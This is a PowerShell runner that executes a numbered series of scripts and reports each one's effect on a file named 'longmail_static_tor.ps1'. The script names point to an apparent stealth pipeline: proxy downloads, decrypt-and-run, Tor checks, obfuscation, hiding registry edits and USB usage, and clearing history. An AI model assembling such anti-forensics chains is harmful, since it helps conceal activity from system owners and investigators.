$ErrorActionPreference = "Stop"
$scripts = @(
    "00_wget_proxy.ps1",
    "0_reveal.ps1",
    "1_decrypt_profile_script.ps1",
    "2_encrypt_smtp_pwd_only.ps1",
    "3_decrypt_&_run.ps1",
    "4_tor_verify.ps1",
    "5_obfuscate.ps1",
    "6_encrypt_profile_script.ps1",
    "7_hide_regedits.ps1",
    "8_obfuscate_usb_usage.ps1",
    "9_clear_history.ps1"
)
foreach ($script in $scripts) {
    try {
        Write-Host "Running $script..." -NoNewline
        [Console]::Out.Flush()
        & ".\$script"
        if ($LASTEXITCODE -ne 0) {
            Write-Host "$script failed with exit code $LASTEXITCODE."
        } else {
            Write-Host "$script completed successfully."
        }
        if (Test-Path ".\longmail_static_tor.ps1") {
            $content = Get-Content ".\longmail_static_tor.ps1" | Select-Object -First 2
            $timestamp = (Get-Item ".\longmail_static_tor.ps1").LastWriteTime
            Write-Host "After $script, longmail_static_tor.ps1 content: $content"
            Write-Host "Timestamp: $timestamp"
        }
        Start-Sleep -Milliseconds 1000  # Increased delay
    } catch {
        Write-Host "Error running $script : $_"
    }
}